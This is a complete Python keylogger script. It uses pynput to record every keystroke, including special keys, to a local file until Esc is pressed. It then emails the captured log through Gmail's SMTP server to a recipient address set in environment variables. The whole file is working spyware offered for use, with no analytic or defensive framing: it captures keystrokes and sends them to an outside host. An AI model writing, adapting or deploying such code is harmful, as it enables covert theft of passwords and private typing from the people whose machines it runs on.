from pynput import keyboard
import smtplib, ssl
import os

# Store email credentials in environment variables for security
sender_mail = os.getenv('SENDER_EMAIL', "user@domain.com")
receiver_mail = os.getenv('RECEIVER_EMAIL', "user@domain.com")
password = os.getenv('EMAIL_PASSWORD', "passcode")

port = 587
message = """From: {0}
To: {1}                         
Subject: KeyLogs

Text: Keylogs
""".format(sender_mail, receiver_mail)

def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)

def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\n[Backspace Pressed]\n")
        elif Key == keyboard.Key.tab:
            write("\n[Tab Pressed]\n")
        elif Key == keyboard.Key.space:
            write(" ")
        else:
            write(f"\n[{Key}] Pressed\n")

def on_key_release(Key):
    if Key == keyboard.Key.esc:
        return False  # Stops listener when 'esc' key is pressed

# Start the listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Read the key logs from the file and send an email
with open("keylogger.txt", 'r') as f:
    logs = f.read()

full_message = message + logs

# Send email securely
context = ssl.create_default_context()
with smtplib.SMTP('smtp.gmail.com', port) as server:
    server.starttls(context=context)
    server.login(sender_mail, password)
    server.sendmail(sender_mail, receiver_mail, full_message)

print(f"Email Sent to {receiver_mail}")
